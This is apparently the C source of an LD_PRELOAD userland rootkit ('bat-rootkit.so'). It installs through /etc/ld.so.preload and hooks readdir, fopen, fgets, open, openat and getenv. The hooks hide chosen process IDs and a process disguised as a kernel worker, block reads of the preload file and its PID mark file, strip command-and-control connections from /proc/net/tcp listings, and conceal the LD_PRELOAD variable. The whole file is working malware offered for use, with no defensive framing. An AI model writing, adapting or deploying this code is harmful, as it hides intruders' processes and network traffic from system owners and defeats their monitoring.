/*
 * bat-rootkit.so   LD_PRELOAD parasite
 *
 * Loaded into every process via /etc/ld.so.preload.
 * Hides target PIDs from all userspace inspection tools.
 *
 * Hooks:
 *   readdir / readdir64  → filters /proc/<hidden_pid> from directory listings
 *   fopen / fopen64      → blocks reads of /proc/<hidden_pid>/X and /etc/ld.so.preload
 *   fgets                → filters C2 connections from /proc/net/tcp[6]
 *   getenv               → hides LD_PRELOAD variable from child process inspection
 *
 * Build-time configuration (injected via -D flags):
 *   HIDE_MARK     path to PID mark file written by bat-agent   (default: /tmp/.sysd)
 *   HIDE_COMM     process comm name to hide                    (default: kworker/0:1H)
 *   C2_IP_HEX     C2 server IP in /proc/net/tcp hex format     (default: empty = no net hide)
 *   C2_PORT_HEX   C2 server port in hex                        (default: empty)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <errno.h>
#include <stdarg.h>

#ifndef HIDE_MARK
#define HIDE_MARK "/tmp/.sysd"
#endif

#ifndef HIDE_COMM
#define HIDE_COMM "kworker/0:1H"
#endif

#ifndef C2_IP_HEX
#define C2_IP_HEX ""
#endif

#ifndef C2_PORT_HEX
#define C2_PORT_HEX ""
#endif

/*  Hidden PID list (loaded from HIDE_MARK at init)  */
#define MAX_HIDDEN 64
static pid_t hidden_pids[MAX_HIDDEN];
static int   hidden_count = 0;

/*  Original function pointers  */
static struct dirent   *(*orig_readdir)(DIR *)             = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *)           = NULL;
static FILE            *(*orig_fopen)(const char *, const char *)   = NULL;
static FILE            *(*orig_fopen64)(const char *, const char *) = NULL;
static char            *(*orig_fgets)(char *, int, FILE *) = NULL;
static char            *(*orig_getenv)(const char *)       = NULL;
static int              (*orig_open)(const char *, int, ...) = NULL;
static int              (*orig_openat)(int, const char *, int, ...) = NULL;

/*  /proc/net/tcp wrapper state  */
#define MAX_TCP_FPS 8
static FILE *tcp_fps[MAX_TCP_FPS];
static int   tcp_fp_count = 0;

static void tcp_fp_register(FILE *fp) {
    if (tcp_fp_count < MAX_TCP_FPS)
        tcp_fps[tcp_fp_count++] = fp;
}

static void tcp_fp_unregister(FILE *fp) {
    for (int i = 0; i < tcp_fp_count; i++) {
        if (tcp_fps[i] == fp) {
            tcp_fps[i] = tcp_fps[--tcp_fp_count];
            return;
        }
    }
}

static int is_tcp_fp(FILE *fp) {
    for (int i = 0; i < tcp_fp_count; i++)
        if (tcp_fps[i] == fp) return 1;
    return 0;
}

/*  Helpers  */

static int is_all_digits(const char *s) {
    if (!s || !*s) return 0;
    while (*s) {
        if (!isdigit((unsigned char)*s)) return 0;
        s++;
    }
    return 1;
}

/* Check if PID name (string of digits) refers to a process we must hide.
 * Uses two mechanisms:
 *   1. Explicit PID list from HIDE_MARK file
 *   2. Comm name match against HIDE_COMM
 */
static int should_hide_pid(const char *name) {
    if (!is_all_digits(name)) return 0;

    pid_t p = (pid_t)atoi(name);
    if (p <= 0) return 0;

    /* Check explicit PID list */
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == p) return 1;
    }

    /* Check comm name   requires orig_fopen to be resolved */
    if (!orig_fopen) return 0;

    char comm_path[64];
    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", name);

    FILE *cf = orig_fopen(comm_path, "r");
    if (!cf) return 0;

    char comm[32] = {0};
    if (fgets(comm, sizeof(comm), cf)) {
        comm[strcspn(comm, "\n")] = 0;
        if (strcmp(comm, HIDE_COMM) == 0) {
            fclose(cf);
            return 1;
        }
    }
    fclose(cf);
    return 0;
}

/* Resolve the real filesystem path of a DIR* using /proc/self/fd/<n> */
static int dir_is_proc(DIR *dirp) {
    int fd = dirfd(dirp);
    if (fd < 0) return 0;

    char fdlink[64], resolved[256];
    snprintf(fdlink, sizeof(fdlink), "/proc/self/fd/%d", fd);

    ssize_t len = readlink(fdlink, resolved, sizeof(resolved) - 1);
    if (len < 0) return 0;
    resolved[len] = 0;

    return strcmp(resolved, "/proc") == 0;
}

/* Check if fopen path targets a hidden PID's proc directory */
static int is_hidden_proc_path(const char *path) {
    if (!path || strncmp(path, "/proc/", 6) != 0) return 0;

    const char *start = path + 6;
    const char *slash = strchr(start, '/');
    if (!slash) return 0;  /* /proc itself or /proc/<pid> without slash   let readdir handle it */

    size_t len = (size_t)(slash - start);
    if (len == 0 || len >= 16) return 0;

    char pidbuf[16];
    memcpy(pidbuf, start, len);
    pidbuf[len] = 0;

    return should_hide_pid(pidbuf);
}

/* Check if path should be fully blocked (returns ENOENT) */
static int is_blocked_path(const char *path) {
    if (!path) return 0;

    /* Block reads of our rootkit mechanism */
    if (strcmp(path, "/etc/ld.so.preload") == 0) return 1;
    if (strcmp(path, HIDE_MARK) == 0)            return 1;

    /* Block /proc/<hidden_pid>/X */
    return is_hidden_proc_path(path);
}

/* Load explicit PID list from HIDE_MARK file */
static void load_hidden_pids(void) {
    if (!orig_fopen) return;

    FILE *f = orig_fopen(HIDE_MARK, "r");
    if (!f) return;

    char line[32];
    while (fgets(line, sizeof(line), f) && hidden_count < MAX_HIDDEN) {
        pid_t p = (pid_t)atoi(line);
        if (p > 0) hidden_pids[hidden_count++] = p;
    }
    fclose(f);
}

/*  Constructor  */

__attribute__((constructor))
static void rootkit_init(void) {
    /* Resolve originals before any hook is called */
    orig_readdir   = dlsym(RTLD_NEXT, "readdir");
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    orig_fopen     = dlsym(RTLD_NEXT, "fopen");
    orig_fopen64   = dlsym(RTLD_NEXT, "fopen64");
    orig_fgets     = dlsym(RTLD_NEXT, "fgets");
    orig_getenv    = dlsym(RTLD_NEXT, "getenv");
    orig_open      = dlsym(RTLD_NEXT, "open");
    orig_openat    = dlsym(RTLD_NEXT, "openat");

    load_hidden_pids();
}

/*  Hook: readdir  */

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) return NULL;

    int in_proc = dir_is_proc(dirp);
    struct dirent *e;

    while ((e = orig_readdir(dirp)) != NULL) {
        if (in_proc && should_hide_pid(e->d_name)) continue;
        return e;
    }
    return NULL;
}

/*  Hook: readdir64  */

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) return NULL;

    int in_proc = dir_is_proc(dirp);
    struct dirent64 *e;

    while ((e = orig_readdir64(dirp)) != NULL) {
        if (in_proc && should_hide_pid(e->d_name)) continue;
        return e;
    }
    return NULL;
}

/*  Hook: fopen  */

FILE *fopen(const char *pathname, const char *mode) {
    if (!orig_fopen) return NULL;

    if (is_blocked_path(pathname)) {
        errno = ENOENT;
        return NULL;
    }

    FILE *fp = orig_fopen(pathname, mode);

    /* Track /proc/net/tcp[6] handles for fgets filtering */
    if (fp && C2_IP_HEX[0] &&
        (strcmp(pathname, "/proc/net/tcp")  == 0 ||
         strcmp(pathname, "/proc/net/tcp6") == 0)) {
        tcp_fp_register(fp);
    }

    return fp;
}

/*  Hook: fopen64  */

FILE *fopen64(const char *pathname, const char *mode) {
    if (!orig_fopen64) return NULL;

    if (is_blocked_path(pathname)) {
        errno = ENOENT;
        return NULL;
    }

    FILE *fp = orig_fopen64(pathname, mode);

    if (fp && C2_IP_HEX[0] &&
        (strcmp(pathname, "/proc/net/tcp")  == 0 ||
         strcmp(pathname, "/proc/net/tcp6") == 0)) {
        tcp_fp_register(fp);
    }

    return fp;
}

/*  Hook: fclose   clean up tcp tracker  */

int fclose(FILE *fp) {
    static int (*orig_fclose)(FILE *) = NULL;
    if (!orig_fclose) orig_fclose = dlsym(RTLD_NEXT, "fclose");

    tcp_fp_unregister(fp);
    return orig_fclose(fp);
}

/*  Hook: fgets   filter C2 connections from /proc/net/tcp  */

char *fgets(char *buf, int size, FILE *stream) {
    if (!orig_fgets) return NULL;

    if (!C2_IP_HEX[0] || !is_tcp_fp(stream))
        return orig_fgets(buf, size, stream);

    char *result;
    while ((result = orig_fgets(buf, size, stream)) != NULL) {
        /* /proc/net/tcp format: "  N: LLLLLLLL:PPPP RRRRRRRR:PPPP ..."
         * RRRRRRRR is the remote address in little-endian hex.
         * Filter lines where remote address:port matches C2. */
        if (C2_IP_HEX[0] && strstr(buf, C2_IP_HEX)) {
            if (!C2_PORT_HEX[0] || strstr(buf, C2_PORT_HEX))
                continue;  /* skip this connection line */
        }
        return result;
    }
    return NULL;
}

/*  Hook: open   block direct syscall-level access to hidden paths  
 * cat, stat, many tools use open() not fopen(). This catches them. */

int open(const char *pathname, int flags, ...) {
    if (!orig_open) return -1;

    if (is_blocked_path(pathname)) {
        errno = ENOENT;
        return -1;
    }

    /* Pass through, preserving optional mode argument */
    va_list ap;
    va_start(ap, flags);
    int mode = va_arg(ap, int);
    va_end(ap);

    return orig_open(pathname, flags, mode);
}

/*  Hook: openat  */

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!orig_openat) return -1;

    /* Absolute paths: check directly */
    if (pathname && pathname[0] == '/' && is_blocked_path(pathname)) {
        errno = ENOENT;
        return -1;
    }

    va_list ap;
    va_start(ap, flags);
    int mode = va_arg(ap, int);
    va_end(ap);

    return orig_openat(dirfd, pathname, flags, mode);
}

/*  Hook: getenv   hide LD_PRELOAD  */

char *getenv(const char *name) {
    if (!orig_getenv) return NULL;
    if (name && strcmp(name, "LD_PRELOAD") == 0) return NULL;
    return orig_getenv(name);
}
